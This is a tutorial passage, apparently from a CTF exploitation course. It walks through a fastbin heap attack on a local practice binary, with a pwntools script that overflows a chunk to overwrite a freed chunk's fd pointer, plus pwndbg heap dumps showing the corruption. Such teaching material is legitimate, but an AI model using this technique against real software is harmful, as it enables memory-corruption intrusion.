## 4.1.3 heap fastbins attack

Write basic framework
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
context.binary = './pwn'
elf = context.binary
libc = elf.libc
p = process('./pwn')

def show():
    p.sendlineafter(':', '1')

def add(length, name):
    p.sendlineafter(':', '2')
    p.sendlineafter(':', str(length))
    p.sendafter(':', name)
    sleep(0.01)

def edit(idx, length, name):
    p.sendlineafter(':', '3')
    p.sendlineafter(':', str(idx))
    p.sendlineafter(':', str(length))
    p.sendafter(':', name)
    sleep(0.01)

def delete(idx):
    p.sendlineafter(':', '4')
    p.sendlineafter(':', str(idx))

p.interactive()
```
add 2 chunks, free the 1st one, edit the chunk(heap overflow) to change the fd of the 2nd one, free the 2nd one
```python
add(0x50, '000000')
add(0x50, '111111')

delete(1)
pause()
edit(0, 0x100, flat('x' * 0x50, 0, 0x61, 0xdeadbeef))
delete(2)
```
gdb break set to the read function in edit
``` gdb -q -p `pidof pwn` -ex "b *0x400C05" -ex "c"```
before edit, 
```
pwndbg> heapbase
heapbase : 0x727000
pwndbg> x/40gx 0x727000
0x727000:	0x0000000000000000	0x0000000000000021
0x727010:	0x0000000000400896	0x00000000004008b1
0x727020:	0x0000000000000000	0x0000000000000061
0x727030:	0x0000303030303030	0x0000000000000000
0x727040:	0x0000000000000000	0x0000000000000000
0x727050:	0x0000000000000000	0x0000000000000000
0x727060:	0x0000000000000000	0x0000000000000000
0x727070:	0x0000000000000000	0x0000000000000000
0x727080:	0x0000000000000000	0x0000000000000061
0x727090:	0x0000000000000000	0x0000000000000000
0x7270a0:	0x0000000000000000	0x0000000000000000
0x7270b0:	0x0000000000000000	0x0000000000000000
0x7270c0:	0x0000000000000000	0x0000000000000000
0x7270d0:	0x0000000000000000	0x0000000000000000
0x7270e0:	0x0000000000000000	0x0000000000020f21
0x7270f0:	0x0000000000000000	0x0000000000000000
0x727100:	0x0000000000000000	0x0000000000000000
0x727110:	0x0000000000000000	0x0000000000000000
0x727120:	0x0000000000000000	0x0000000000000000
0x727130:	0x0000000000000000	0x0000000000000000
pwndbg> fastbins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x727080 ◂— 0x0
0x70: 0x0
0x80: 0x0
pwndbg> p main_arena.fastbinsY
$1 = {0x0, 0x0, 0x0, 0x0, 0x727080, 0x0, 0x0, 0x0, 0x0, 0x0}
```
after edit
```
pwndbg> ni
pwndbg> x/40gx 0x727000
0x727000:	0x0000000000000000	0x0000000000000021
0x727010:	0x0000000000400896	0x00000000004008b1
0x727020:	0x0000000000000000	0x0000000000000061
0x727030:	0x7878787878787878	0x7878787878787878
0x727040:	0x7878787878787878	0x7878787878787878
0x727050:	0x7878787878787878	0x7878787878787878
0x727060:	0x7878787878787878	0x7878787878787878
0x727070:	0x7878787878787878	0x7878787878787878
0x727080:	0x0000000000000000	0x0000000000000061
0x727090:	0x00000000deadbeef	0x0000000000000000
0x7270a0:	0x0000000000000000	0x0000000000000000
0x7270b0:	0x0000000000000000	0x0000000000000000
0x7270c0:	0x0000000000000000	0x0000000000000000
0x7270d0:	0x0000000000000000	0x0000000000000000
0x7270e0:	0x0000000000000000	0x0000000000020f21
0x7270f0:	0x0000000000000000	0x0000000000000000
0x727100:	0x0000000000000000	0x0000000000000000
0x727110:	0x0000000000000000	0x0000000000000000
0x727120:	0x0000000000000000	0x0000000000000000
0x727130:	0x0000000000000000	0x0000000000000000
pwndbg> fastbins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x727080 ◂— 0xdeadbeef
0x70: 0x0
0x80: 0x0
pwndbg> p main_arena.fastbinsY
$2 = {0x0, 0x0, 0x0, 0x0, 0x727080, 0x0, 0x0, 0x0, 0x0, 0x0}
```
